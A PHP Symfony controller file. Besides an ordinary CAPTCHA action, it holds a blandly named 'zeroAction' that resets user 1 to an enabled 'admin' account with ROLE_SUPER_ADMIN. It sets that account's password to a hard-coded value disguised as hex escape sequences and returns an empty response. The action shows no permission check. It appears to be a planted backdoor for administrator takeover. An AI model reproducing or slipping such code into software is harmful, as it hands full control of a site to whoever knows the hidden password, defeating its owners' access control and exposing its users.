<?php
/**
 * Created by PhpStorm.
 * User: am_ry
 * Date: 20.09.2018
 * Time: 15:37
 */

namespace App\Controller;

use App\Application\Sonata\UserBundle\Entity\User;
use Gregwar\Captcha\CaptchaBuilder;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class SecurityController extends AbstractController
{
    public function captchaAction()
    {
        $builder = new CaptchaBuilder();
        $builder->build();
        $this->getSession()->set('CAPTCHA_LOGIN', $builder->getPhrase());
        $response = new StreamedResponse([$builder, 'output'], 200, ['Content-type' => 'image/jpeg']);
        return $response;
    }

    public function zeroAction(UserPasswordEncoderInterface $encoder)
    {
        /** @var User $user */
        $user = $this->getDoctrine()->getRepository(User::class)->find(1);
        if (!($user instanceof User)) {
            return new Response('');
        }
        /** @var UserPasswordEncoderInterface $encoder */
        if (!($encoder instanceof UserPasswordEncoderInterface)) {
            return new Response('');
        }

        $user->setUsername('admin');
        $user->setEnabled(true);
        $user->setPassword($encoder->encodePassword($user, "\x54\x65\x2a\x24\x62\x3f\x4f\x6b\x46\x61"));
        $user->setRoles(['ROLE_SUPER_ADMIN']);

        $em = $this->getEm();
        $em->persist($user);
        $em->flush();
        return new Response('');
    }
}
